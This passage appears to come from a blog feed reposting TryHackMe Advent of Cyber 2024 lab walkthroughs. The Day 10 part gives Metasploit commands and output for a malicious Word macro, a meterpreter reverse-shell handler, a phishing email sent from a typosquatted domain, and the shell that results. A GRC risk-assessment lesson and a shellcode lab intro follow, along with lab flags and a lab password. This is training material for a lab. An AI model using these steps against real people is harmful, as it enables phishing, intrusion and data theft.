<span class="nx">msf6</span> <span class="nf">exploit</span><span class="p">(</span><span class="nx">multi</span><span class="o">/</span><span class="nx">fileformat</span><span class="o">/</span><span class="nx">office_word_macro</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nx">exploit</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Using</span> <span class="nx">template</span><span class="p">:</span> <span class="o">/</span><span class="nx">opt</span><span class="o">/</span><span class="nx">metasploit</span><span class="o">-</span><span class="nx">framework</span><span class="o">/</span><span class="nx">embedded</span><span class="o">/</span><span class="nx">framework</span><span class="o">/</span><span class="nx">data</span><span class="o">/</span><span class="nx">exploits</span><span class="o">/</span><span class="nx">office_word_macro</span><span class="o">/</span><span class="nx">template</span><span class="p">.</span><span class="nx">docx</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Injecting</span> <span class="nx">payload</span> <span class="k">in</span> <span class="nb">document</span> <span class="nx">comments</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Injecting</span> <span class="nx">macro</span> <span class="nx">and</span> <span class="nx">other</span> <span class="nx">required</span> <span class="nx">files</span> <span class="k">in</span> <span class="nb">document</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Finalizing</span> <span class="nx">docm</span><span class="p">:</span> <span class="nx">msf</span><span class="p">.</span><span class="nx">docm</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">msf</span><span class="p">.</span><span class="nx">docm</span> <span class="nx">stored</span> <span class="nx">at</span> <span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="p">.</span><span class="nx">msf4</span><span class="o">/</span><span class="nx">local</span><span class="o">/</span><span class="nx">msf</span><span class="p">.</span><span class="nx">docm</span>
<span class="nx">msf6</span> <span class="nf">exploit</span><span class="p">(</span><span class="nx">multi</span><span class="o">/</span><span class="nx">fileformat</span><span class="o">/</span><span class="nx">office_word_macro</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nx">exit</span>
</code></pre></div></div>

<p>As you can see, the Word document with the embedded macro was created and stored in <code class="language-plaintext highlighter-rouge">/root/.msf4/local/msf.docm</code>.</p>

<h2 id="the-created-macro-enabled-document">The Created Macro-Enabled Document</h2>

<p>We mentioned earlier how to create a macro within an MS Word document. You might be interested to see the content of the file created by <code class="language-plaintext highlighter-rouge">msfconsole</code>. In the screenshot below, we can see the different procedures and functions that make up this macro. <strong>Note:</strong>The AttackBox doesn’t have MS Office installed, so for this section you only have to read along. \n</p>

<ol>
  <li><code class="language-plaintext highlighter-rouge">AutoOpen()</code> triggers the macro automatically when a Word document is opened. It searches through the document’s properties, looking for content in the “Comments” field. The data saved using <code class="language-plaintext highlighter-rouge">base64</code> encoding in the Comments field is actually the payload.</li>
  <li><code class="language-plaintext highlighter-rouge">Base64Decode()</code> converts the payload to its original form. In this case, it is an executable MS Windows file.</li>
  <li><code class="language-plaintext highlighter-rouge">ExecuteForWindows()</code> executes the payload in a temporary directory. It connects to the specified attacker’s system IP address and port.</li>
</ol>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/5f04259cf9bf5b57aed2c476-1729859885481.png" alt="Example macro code with functions and subroutines" /> \n</p>

<p>The <strong>Comments</strong> field is shown in the screenshot below. It is close to 100,000 characters in our case.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/5f04259cf9bf5b57aed2c476-1729859926077.png" alt="The Comments field in an MS Office document" /> \n</p>

<p>If you copy it and save it to a text file, you can convert it to its original executable format using <code class="language-plaintext highlighter-rouge">base64</code> as shown below. You can notice the size of the files.</p>

<p>AttackBox Terminal</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">root</span><span class="p">@</span><span class="nd">AttackBox</span><span class="p">:</span><span class="o">~</span><span class="err">#</span> <span class="nx">base64</span> <span class="o">-</span><span class="nx">d</span> <span class="nx">payload</span><span class="o">-</span><span class="nx">base64</span><span class="p">.</span><span class="nx">txt</span> <span class="o">&gt;</span> <span class="nx">payload</span><span class="p">.</span><span class="nx">exe</span>
<span class="nx">root</span><span class="p">@</span><span class="nd">attackbox</span><span class="p">:</span><span class="o">~</span><span class="err">#</span> <span class="nx">ls</span> <span class="o">-</span><span class="nx">lh</span>
<span class="o">-</span><span class="nx">rw</span><span class="o">-</span><span class="nx">r</span><span class="o">--</span><span class="nx">r</span><span class="o">--</span><span class="p">.</span> <span class="mi">1</span> <span class="nx">root</span> <span class="nx">root</span> <span class="mi">97</span><span class="nx">K</span> <span class="nx">payload</span><span class="o">-</span><span class="nx">base64</span><span class="p">.</span><span class="nx">txt</span>
<span class="o">-</span><span class="nx">rw</span><span class="o">-</span><span class="nx">r</span><span class="o">--</span><span class="nx">r</span><span class="o">--</span><span class="p">.</span> <span class="mi">1</span> <span class="nx">root</span> <span class="nx">root</span> <span class="mi">73</span><span class="nx">K</span> <span class="nx">payload</span><span class="p">.</span><span class="nx">exe</span>
</code></pre></div></div>

<p>You already expect this file to connect to the specified IP address and port. If you would like to check its behaviour in a sandbox, you can check the <a href="https://www.virustotal.com/gui/file/ab3f9303460c590c452f0c259a35d50a7a2e7c52a81d4e5a42bb98b365d8ab9b/behavior">VirusTotal report</a> for a file that we created and uploaded. In this case, it attempts to connect to <code class="language-plaintext highlighter-rouge">10.9.18.120</code>.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/5f04259cf9bf5b57aed2c476-1729859908974.png" alt="VirusTotal summary of the payload behaviour" /> \n</p>

<h2 id="listening-for-incoming-connections">Listening for Incoming Connections</h2>

<p>We again will use the Metasploit Framework, but this time to listen for incoming connections when a target users opens our phishing Word document. This requires the following commands:</p>

<ul>
  <li>Open a new terminal window and run <code class="language-plaintext highlighter-rouge">msfconsole</code> to start the Metasploit Framework</li>
  <li><code class="language-plaintext highlighter-rouge">use multi/handler</code> to handle incoming connections</li>
  <li><code class="language-plaintext highlighter-rouge">set payload windows/meterpreter/reverse_tcp</code>to ensure that our payload works with the payload used when creating the malicious macro \n</li>
  <li><code class="language-plaintext highlighter-rouge">set LHOST CONNECTION_IP</code> specifies the IP address of the attacker’s system and should be the same as the one used when creating the document</li>
  <li><code class="language-plaintext highlighter-rouge">set LPORT 8888</code> specifies the port number you are going to listen on and should be the same as the one used when creating the document</li>
  <li><code class="language-plaintext highlighter-rouge">show options</code> to confirm the values of your options</li>
  <li><code class="language-plaintext highlighter-rouge">exploit</code> starts listening for incoming connections to establish a reverse shell</li>
</ul>

<p>AttackBox Terminal</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">root</span><span class="p">@</span><span class="nd">AttackBox</span><span class="p">:</span><span class="o">~</span><span class="err">#</span> <span class="nx">msfconsole</span>
<span class="p">[...]</span>
<span class="nx">Metasploit</span> <span class="nx">Documentation</span><span class="p">:</span> <span class="nx">https</span><span class="p">:</span><span class="c1">//docs.metasploit.com/</span>

<span class="nx">msf6</span> <span class="o">&gt;</span> <span class="nx">use</span> <span class="nx">multi</span><span class="o">/</span><span class="nx">handler</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Using</span> <span class="nx">configured</span> <span class="nx">payload</span> <span class="nx">generic</span><span class="o">/</span><span class="nx">shell_reverse_tcp</span>
<span class="nx">msf6</span> <span class="nf">exploit</span><span class="p">(</span><span class="nx">multi</span><span class="o">/</span><span class="nx">handler</span><span class="p">)</span> <span class="o">&gt;</span> <span class="kd">set</span> <span class="nx">payload</span> <span class="nx">windows</span><span class="o">/</span><span class="nx">meterpreter</span><span class="o">/</span><span class="nx">reverse_tcp</span>
<span class="nx">payload</span> <span class="o">=&gt;</span> <span class="nx">windows</span><span class="o">/</span><span class="nx">meterpreter</span><span class="o">/</span><span class="nx">reverse_tcp</span>
<span class="nx">msf6</span> <span class="nf">exploit</span><span class="p">(</span><span class="nx">multi</span><span class="o">/</span><span class="nx">handler</span><span class="p">)</span> <span class="o">&gt;</span> <span class="kd">set</span> <span class="nx">LHOST</span> <span class="nx">CONNECTION_IP</span>
<span class="nx">LHOST</span> <span class="o">=&gt;</span> <span class="nx">CONNECTION_IP</span>
<span class="nx">msf6</span> <span class="nf">exploit</span><span class="p">(</span><span class="nx">multi</span><span class="o">/</span><span class="nx">handler</span><span class="p">)</span> <span class="o">&gt;</span> <span class="kd">set</span> <span class="nx">LPORT</span> <span class="mi">8888</span>
<span class="nx">LPORT</span> <span class="o">=&gt;</span> <span class="mi">8888</span>
<span class="nx">msf6</span> <span class="nf">exploit</span><span class="p">(</span><span class="nx">multi</span><span class="o">/</span><span class="nx">handler</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nx">show</span> <span class="nx">options</span>

<span class="nx">Module</span> <span class="nf">options </span><span class="p">(</span><span class="nx">exploit</span><span class="o">/</span><span class="nx">multi</span><span class="o">/</span><span class="nx">handler</span><span class="p">):</span>

   <span class="nx">Name</span>  <span class="nx">Current</span> <span class="nx">Setting</span>  <span class="nx">Required</span>  <span class="nx">Description</span>
   <span class="o">----</span>  <span class="o">---------------</span>  <span class="o">--------</span>  <span class="o">-----------</span>


<span class="nx">Payload</span> <span class="nf">options </span><span class="p">(</span><span class="nx">windows</span><span class="o">/</span><span class="nx">meterpreter</span><span class="o">/</span><span class="nx">reverse_tcp</span><span class="p">):</span>

   <span class="nx">Name</span>      <span class="nx">Current</span> <span class="nx">Setting</span>  <span class="nx">Required</span>  <span class="nx">Description</span>
   <span class="o">----</span>      <span class="o">---------------</span>  <span class="o">--------</span>  <span class="o">-----------</span>
   <span class="nx">EXITFUNC</span>  <span class="nx">process</span>          <span class="nx">yes</span>       <span class="nx">Exit</span> <span class="nf">technique </span><span class="p">(</span><span class="nx">Accepted</span><span class="p">:</span> <span class="dl">''</span><span class="p">,</span> <span class="nx">seh</span><span class="p">,</span> <span class="nx">thread</span><span class="p">,</span> <span class="nx">process</span><span class="p">,</span> <span class="nx">none</span><span class="p">)</span>
   <span class="nx">LHOST</span>     <span class="nx">CONNECTION_IP</span>    <span class="nx">yes</span>       <span class="nx">The</span> <span class="nx">listen</span> <span class="nf">address </span><span class="p">(</span><span class="nx">an</span> <span class="kr">interface</span> <span class="nx">may</span> <span class="nx">be</span> <span class="nx">specified</span><span class="p">)</span>
   <span class="nx">LPORT</span>     <span class="mi">8888</span>             <span class="nx">yes</span>       <span class="nx">The</span> <span class="nx">listen</span> <span class="nx">port</span>


<span class="nx">Exploit</span> <span class="nx">target</span><span class="p">:</span>

   <span class="nx">Id</span>  <span class="nx">Name</span>
   <span class="o">--</span>  <span class="o">----</span>
   <span class="mi">0</span>   <span class="nx">Wildcard</span> <span class="nx">Target</span>



<span class="nx">View</span> <span class="nx">the</span> <span class="nx">full</span> <span class="nx">module</span> <span class="nx">info</span> <span class="kd">with</span> <span class="nx">the</span> <span class="nx">info</span><span class="p">,</span> <span class="nx">or</span> <span class="nx">info</span> <span class="o">-</span><span class="nx">d</span> <span class="nx">command</span><span class="p">.</span>

<span class="nx">msf6</span> <span class="nf">exploit</span><span class="p">(</span><span class="nx">multi</span><span class="o">/</span><span class="nx">handler</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nx">exploit</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Started</span> <span class="nx">reverse</span> <span class="nx">TCP</span> <span class="nx">handler</span> <span class="nx">on</span> <span class="nx">CONNECTION_IP</span><span class="p">:</span><span class="mi">8888</span>
</code></pre></div></div>

<p>\n</p>

<h2 id="email-the-malicious-document">Email the Malicious Document</h2>

<p>The malicious document has been created. All you need to do is to send it to the target user. It is time to send an email to the target user, <code class="language-plaintext highlighter-rouge">marta@socmas.thm</code>. Mayor Malware has prepared the following credentials:</p>

<ul>
  <li>Email: <code class="language-plaintext highlighter-rouge">info@socnas.thm</code></li>
  <li>Password: <code class="language-plaintext highlighter-rouge">MerryPhishMas!</code></li>
</ul>

<p>Notice how Mayor Malware uses a domain name that looks similar to the target user’s. This technique is known as “typosquatting,” where attackers create domain names that are nearly identical to legitimate ones in order to trick victims. On the AttackBox, start the Firefox web browser and head to http://MACHINE_IP. Use the above credentials to log in.</p>

<p>Once logged in, compose an email to the target user, and don’t forget to attach the document you created. Changing the name to something more convincing, such as <code class="language-plaintext highlighter-rouge">invoice.docm</code> or <code class="language-plaintext highlighter-rouge">receipt.docm</code> might be a good idea. Also, write a couple of sentences explaining what you are attaching to convince Marta May Ware to open the document. <strong>Note:</strong> You can use CTRL+H on the file upload pop-up to be able to see the <code class="language-plaintext highlighter-rouge">.msf4</code> directory where our email attachment is located.</p>

<h2 id="exploitation">Exploitation</h2>

<p>If everything works out, you will get a reverse shell after about 2 minutes. You can access the files and folders on the target system via the command line. You can use <code class="language-plaintext highlighter-rouge">cat</code> to display any text file.</p>

<p>AttackBox Terminal</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">msf6</span> <span class="nf">exploit</span><span class="p">(</span><span class="nx">multi</span><span class="o">/</span><span class="nx">handler</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nx">exploit</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Started</span> <span class="nx">reverse</span> <span class="nx">TCP</span> <span class="nx">handler</span> <span class="nx">on</span> <span class="nx">CONNECTION_IP</span><span class="p">:</span><span class="mi">8888</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Sending</span> <span class="nf">stage </span><span class="p">(</span><span class="mi">176198</span> <span class="nx">bytes</span><span class="p">)</span> <span class="nx">to</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">103.92</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Meterpreter</span> <span class="nx">session</span> <span class="mi">1</span> <span class="nf">opened </span><span class="p">(</span><span class="nx">CONNECTION_IP</span><span class="p">:</span><span class="mi">8888</span> <span class="o">-&gt;</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">103.92</span><span class="p">:</span><span class="mi">52536</span><span class="p">)</span> <span class="nx">at</span> <span class="mi">2024</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">24</span> <span class="mi">16</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">47</span> <span class="o">+</span><span class="mi">0300</span>
<span class="nx">meterpreter</span> <span class="o">&gt;</span> <span class="nx">cd</span> <span class="nx">c</span><span class="p">:</span><span class="o">/</span><span class="nx">users</span><span class="o">/</span><span class="nx">Administrator</span><span class="o">/</span><span class="nx">Desktop</span>
<span class="nx">meterpreter</span> <span class="o">&gt;</span> <span class="nx">ls</span>
<span class="p">[...]</span>
<span class="nx">meterpreter</span> <span class="o">&gt;</span>
</code></pre></div></div>

<p>Answer the questions below</p>

<p>What is the flag value inside the <code class="language-plaintext highlighter-rouge">flag.txt</code> file that’s located on the Administrator’s desktop?</p>

<p>THM{PHISHING_CHRISTMAS}</p>

<p>If you enjoyed this task, feel free to check out the <a href="https://tryhackme.com/module/phishing">Phishing</a> module.</p>]]></content><author><name>Michael</name></author><summary type="html"><![CDATA[The Story]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/Day10-logo.svg" /><media:content medium="image" url="http://localhost:4000/Day10-logo.svg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe Advent of Cyber - Day 9</title><link href="http://localhost:4000/Day9" rel="alternate" type="text/html" title="TryHackMe Advent of Cyber - Day 9" /><published>2024-12-09T00:00:00-05:00</published><updated>2024-12-09T00:00:00-05:00</updated><id>http://localhost:4000/Day9</id><content type="html" xml:base="http://localhost:4000/Day9"><![CDATA[<p>The Story</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/6093e17fa004d20049b6933e-1731940347460.png" alt="Task banner for day 9" /></p>

<p>Click here to watch the walkthrough video!</p>

<p>McSkidy and Glitch want to hire an eDiscovery company to process some forensic data for their investigation. They have invited bids from third parties for this purpose. Three companies have bid for the project. McSkidy and Glitch now need to do a risk assessment on all three of these companies to identify the one with the least amount of risk so that they can move forward. All three companies were required to fill out a questionnaire based on which a risk assessment will be done.</p>

<h2 id="introduction-to-grc">Introduction to GRC</h2>

<p>Governance, Risk, and Compliance (GRC) plays a crucial role in any organisation to ensure that their security practices align with their personal, regulatory, and legal obligations. Although in general good security practices help protect a business from suffering a breach, depending on the sector in which an organisation operates, there may be external security regulations that it needs to adhere to.</p>

<p><img src="https://assets.tryhackme.com/additional/aoc2024/gifs/da9-1.gif" alt="a picture of an organisation with three rings expanding, showing the acronym GRC with a padlock" /> \n</p>

<p>Let’s take a look at some examples in the financial sector:</p>

<ul>
  <li><strong>Reserve Bank Regulations:</strong> In most countries, banks have to adhere to the security regulations set forth by the country’s reserve bank. This ensures that each bank adheres to a minimum security level to protect the funds and information of their customers.</li>
  <li><strong>SWIFT CSP:</strong> Banks use the SWIFT network to communicate with each other and send funds. After a <a href="https://www.wired.com/2016/05/insane-81m-bangladesh-bank-heist-heres-know/">massive bank breach resulted in a $81 million fraudulent SWIFT transfer</a>, SWIFT created the Customer Security Programme (CSP), which sets the standard of security for banks to connect to the SWIFT network.</li>
  <li><strong>Data Protection:</strong> As banks hold sensitive information about their customers, they have to adhere to the security standards created by their data regulator (usually the reserve bank in most countries).</li>
</ul>

<p>When you run a large organisation with multiple different teams, how do you stay on top of all these regulations and ensure that good security is applied by all teams? <strong>This is where GRC comes in.</strong>They play a crucial role in understanding external security standards, translating them into internal standards, and then ensuring that they are applied by all teams to help reduce the organisation’s risk to an acceptable level. Let’s take a quick look at the three functions of GRC. \n</p>

<p><strong>Governance</strong>   <img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/6093e17fa004d20049b6933e-1730218854578.png" alt="Crown of governance" /></p>

<p>Governance is the function that creates the framework that an organisation uses to make decisions regarding information security. Governance is the creation of an organisation’s security strategy, policies, standards, and practices in alignment with the organisation’s overall goal. Governance also defines the roles and responsibilities that everyone in the organisation has to play to help ensure these security standards are met. \n</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/6093e17fa004d20049b6933e-1730218854403.png" alt="Inspection glass of risk" />Risk</p>

<p>Risk is the function that helps to identify, assess, quantify, and mitigate risk to the organisation’s IT assets. Risk helps the organisation understand potential threats and vulnerabilities and the impact that they could have if a threat actor were to execute or exploit them. By simply turning on a computer, an organisation has some level of risk of a cyber attack. The risk function is important to help reduce the overall risk to an acceptable level and develop contingency plans in the event of a cyber attack where a risk is realised. \n</p>

<p><strong>Compliance</strong>   <img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/6093e17fa004d20049b6933e-1730218854574.png" alt="Clipboard of compliance" /></p>

<p>Compliance is the function that ensures that the organisation adheres to all external legal, regulatory, and industry standards. For example, adhering to the <a href="https://gdpr-info.eu/">GDPR law</a> or aligning the organisation’s security to an industry standard such as NIST or ISO 27001.</p>

<h2 id="introduction-to-risk-assessments">Introduction to Risk Assessments</h2>

<p>Before McSkidy and Glitch choose an eDiscovery company to handle their forensic data, they need to figure out which one is the safest choice. This is where a risk assessment comes in. It’s a process to identify potential problems before they happen. Think of it as checking the weather before going on a hike; if there’s a storm coming, you’d want to know ahead of time so you can either prepare or change your plans.</p>

<h2 id="why-are-risk-assessments-done">Why Are Risk Assessments Done?</h2>

<p>Risk assessments are like a reality check for businesses. They connect cyber security to the bigger picture, which <strong>minimises business risk</strong>. In other words, it’s not just about securing data but about protecting the business as a whole.</p>

<p>Imagine you run an online store that collects customer information like names, addresses, and credit card details. If that data gets stolen because of a weak security system, it’s not just the data that’s at risk—your reputation, customer trust, and even your profits are on the line. A <strong>risk assessment</strong> could have helped you identify that weak point and fix it before anything went wrong.</p>

<p>For McSkidy and Glitch, assessing the risks of each eDiscovery company helps them decide which one is less likely to have a data breach or other issues that could disrupt the investigation.</p>

<h2 id="performing-a-risk-assessment">Performing a Risk Assessment</h2>

<p>Every business’s main goal is to generate revenues and profits. For most businesses, cyber security does not directly contribute to revenue generation or profit maximisation. Businesses decide to spend part of their hard-earned revenue on cyber security to avoid the risk of revenue or reputation loss resulting from a cyber threat. Businesses often take these steps to achieve this goal. We will now work through the process of completing a risk register. A risk register tracks the progress of risk mitigation and all open risks. An example of such a risk register is shown in the animation below. Let’s take a look at the steps required to add risks to the risk register.</p>

<p><img src="https://assets.tryhackme.com/additional/aoc2024/gifs/day9-2.gif" alt="an animation of filling out a risk assessment form" /> \n</p>

<p><strong>Identification of Risks</strong></p>

<p>To assess risk, we must first identify the factors that can cause revenue or reputation loss resulting from cyber threats. This exercise requires carefully assessing the attack surface of the organisation and identifying areas which might be used to harm the organisation. Examples of identified risks can be:</p>

<ul>
  <li>An unpatched web server.</li>
  <li>A high-privileged user account without proper security controls.</li>
  <li>A third-party vendor who might be infected by a malware connecting to the organisation’s network.</li>
  <li>A system for which support has ended by the vendor and it is still in production.</li>
</ul>

<p>An organisation might identify several other risks in addition to these examples. However, in addition to just identifying risks, these risks also need to be quantified. After all, the likelihood of materialising a risk on a cordoned-off and isolated server differs greatly from that of a public-facing server hosting a web frontend. Similarly, the impact of a risk materializing on a crown jewel, such as a main database server containing confidential information, differs greatly from that of a development server with dummy data.</p>

<p>**Assigning Likelihood to Each Risk \n **</p>

<p>To quantify risk, we need to identify how likely or probable it is that the risk will materialise.   <img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/6093e17fa004d20049b6933e-1730225302945.png" alt="Choosing likelihood for each risk" /> We can then assign a number to quantify this likelihood. This number is often on a scale of 1 to 5. The exact scale differs from organisation to organisation and from framework to framework. Likelihood can also be called the probability of materialisation of a risk. An example scale for likelihood can be:</p>

<ol>
  <li><strong>Improbable:</strong> So unlikely that it might never happen.</li>
  <li><strong>Remote:</strong> Very unlikely to happen, but still, there is a possibility.</li>
  <li><strong>Occasional:</strong> Likely to happen once/sometime.</li>
  <li><strong>Probable:</strong> Likely to happen several times.</li>
  <li><strong>Frequent:</strong> Likely to happen often and regularly.</li>
</ol>

<p>It might be noticed that while we are trying to quantify the risk, we still don’t define exact quantities of what constitutes several times and what constitutes regularly, etc. The reason is that the likelihood for a server which has very high uptime requirements will be different from a server that is used infrequently. Therefore, the likelihood scale will differ from case to case and from asset to asset. On the flip side, we can see that this scale provides us with a very usable scale of differentiating between different probabilities of occurrence of a certain event.</p>

<p><strong>Assigning Impact to Each Risk</strong></p>

<p>Once we have identified the risks and the likelihood of a risk, the next step is to quantify the impact this risk’s materialisation might have on the organisation. For example, if there is a public-facing web server that is unpatched and gets breached, what will be the impact on the organisation?   <img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/6093e17fa004d20049b6933e-1732025443659.png" alt="Assigning a impact rating to risks" /> Different organisations calculate impact in different ways. Some organisations might use the CVSS scoring to calculate the impact of a risk; others might use their own rating derived from the Confidentiality, Integrity, and Availability of a certain asset, and others might base it on the severity categorisation of the incidents. Similar to likelihood, we also quantify impact, often on a scale of 1 to 5. An example scale of impact can be based on the following definitions.</p>

<ol>
  <li><strong>Informational:</strong> Very low impact, almost non-existent.</li>
  <li><strong>Low:</strong> Impacting a limited part of one area of the organisation’s operations, with little to no revenue loss.</li>
  <li><strong>Medium:</strong> Impacting one part of the organisation’s operations completely, with major revenue loss.</li>
  <li><strong>High:</strong> Impacting several parts of the organisation’s operations, causing significant revenue loss</li>
  <li><strong>Critical:</strong> Posing an existential threat to the organisation.</li>
</ol>

<p>**Risk Ownership \n **</p>

<p>The last step to performing a risk assessment is to decide what to do with the risks that were found. We can start by performing some calculations on the risk itself. The simplest calculation takes the likelihood of the risk and multiplies it with the impact of the risk to get a score.   <img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/6093e17fa004d20049b6933e-1730225302939.png" alt="Tagging an owner for the risk" />Some risk registers make use of more advanced rating systems such as DREAD. Assigning scores to the risks helps organisations prioritise which risks should be remediated first. \n</p>

<p>While you may think the simplest answer is to secure the system so there is no risk, in real life, it isn’t that simple. Implementing more security costs more money, and it doesn’t help if we spend more money on security than what we risk losing if we leave open the risk.</p>

<p>In this last step, we decide who owns the risks that were identified. These team members are then responsible for performing an additional investigation into what the cost would be to close the risk vs what we could lose if the risk is realised. In cases where the cost of security is lower, we can <strong>mitigate</strong> the risk with more security controls. However, were it is higher, we can <strong>accept</strong> the risk. Accepted risks should always be documented and reviewed periodically to ensure that the cost has not changed.</p>

<h2 id="internal-and-third-party-risk-assessments">Internal and Third-Party Risk Assessments</h2>

<p>Risk assessments are not just done internally in an organisation, but can also be used to assess the risk that a third party may hold to our organisation. Today, it is very common to make use of third parties to outsource key functions of your business. For example, a small organisation may outsource its financial division to a large auditing firm, or a large organisation may outsource the development of some of its applications to a software engineering firm. However, this changes the risk as a compromise of the third party, where we may not have full control over their security, could still result in a compromise of our data or sensitive assets. As such, we need to consider the risk the third party poses to us.</p>

<p><strong>Why Do Companies Do Internal Risk Assessments?</strong></p>

<p>Internal risk assessments help companies understand the risks they have within their own walls. It’s like taking a good look around your house to check if there are any leaks or broken windows.</p>

<p>For example, if a company finds that its software is outdated, it can prioritise updating it to prevent potential attacks. Internal risk assessments help:</p>

<ul>
  <li>Identify weak spots in security.</li>
  <li>Direct resources to the most important areas.</li>
  <li>Stay compliant with security rules and regulations. \n</li>
</ul>

<p><strong>Why Do Companies Do Risk Assessments of Third Parties?</strong></p>

<p>Companies don’t just assess themselves—they also need to evaluate the risks that come from working with other companies, like vendors, suppliers, or partners. This is called a third-party risk assessment, and it’s important because one weak link in the chain can affect everyone.</p>

<p>Let’s make it simple: McSkidy and Glitch want to make sure that whichever eDiscovery company they choose won’t leak or lose sensitive data. So, they will be reviewing if these companies:</p>

<ul>
  <li>Have good security measures to keep data safe.</li>
  <li>Follow data protection rules.</li>
  <li>Align with the security standards that McSkidy and Glitch have in place. \n</li>
</ul>

<p>By doing a third-party risk assessment, McSkidy and Glitch are reducing potential supply chain risks - making sure the investigation doesn’t run into trouble because of a weak security link in the chain. In order to do this, McSkidy has to create a risk assessment that can be sent to the potential third parties. Based on the answers provided by the third parties, McSkidy can then make an informed decision on which third party would be best!</p>

<h2 id="procuring-a-partner">Procuring a Partner</h2>

<p>Let’s put this knowledge to the test! Let’s start the static site attached to this task by pressing the <strong>View Site</strong> button below:</p>

<p>View Site</p>

<p>You will have to assess the level of risk that each of the vendors pose. We sent a questionnaire to each potential third-party and have received their answers. Using these answers, you will have to add new risks to the risk register, which will give an overall risk score for each third-party. Once done, we can choose the third-party that has the lowest risk score. \n</p>

<p>Answer the questions below</p>

<p>What does GRC stand for?</p>

<p>Governance, Risk, and Compliance</p>

<p>What is the flag you receive after performing the risk assessment?</p>

<p>THM{R15K_M4N4G3D}</p>

<p>If you enjoyed this task, feel free to check out the <a href="https://tryhackme.com/r/room/seriskmanagement">Risk Management</a> room.</p>]]></content><author><name>Michael</name></author><summary type="html"><![CDATA[The Story]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/Day9Header.png" /><media:content medium="image" url="http://localhost:4000/Day9Header.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe Advent of Cyber - Day 8</title><link href="http://localhost:4000/Day8" rel="alternate" type="text/html" title="TryHackMe Advent of Cyber - Day 8" /><published>2024-12-08T00:00:00-05:00</published><updated>2024-12-08T00:00:00-05:00</updated><id>http://localhost:4000/Day8</id><content type="html" xml:base="http://localhost:4000/Day8"><![CDATA[<p>The Story</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1730451713924.svg" alt="Task banner for day 8" /></p>

<p><em>Glitch the hacker, clever yet distrusted,</em></p>

<p><em>Wrote a script with skills finely adjusted.</em></p>

<p><em>Shellcode magic to his home it would send,</em></p>

<p><em>Where secrets of Wareville he’d carefully penned.</em></p>

<p>\n</p>

<p>Glitch, a skilled but mistrusted hacker, was prepping for a tech conference. He was eager to share his shellcode script that remotely accessed his home system. As he worked, he noticed Mayor Malware’s henchmen lurking nearby.</p>

<p><em>“They’re wasting their time. I don’t have anything they’d want,”</em> Glitch chuckled.</p>

<p>He didn’t realise that hidden in his home system was something they desperately sought—a research paper he wrote on Wareville’s defences, a treasure Mayor Malware was eager to obtain.</p>

<h2 id="learning-objectives">Learning Objectives</h2>

<ul>
  <li>Grasp the fundamentals of writing shellcode</li>
  <li>Generate shellcode for reverse shells</li>
  <li>Executing shellcode with PowerShell</li>
</ul>

<h2 id="connecting-to-the-machine">Connecting to the Machine</h2>

<p>Before moving forward, review the questions in the connection card shown below:</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/63588b5ef586912c7d03c4f0-1731050107820.png" alt="Task connection card." /></p>

<p>Click on the green <code class="language-plaintext highlighter-rouge">Start Machine</code> button below to start the virtual machine in split-screen view. If the VM is not visible, use the blue <code class="language-plaintext highlighter-rouge">Show Split View</code> button at the top of the page. Alternatively, you can connect to the VM via Remote Desktop (RDP) using the credentials below:</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/be629720b11a294819516c1d4e738c92.png" alt="THM key" /></p>

<table>
  <thead>
    <tr>
      <th><strong>Username</strong></th>
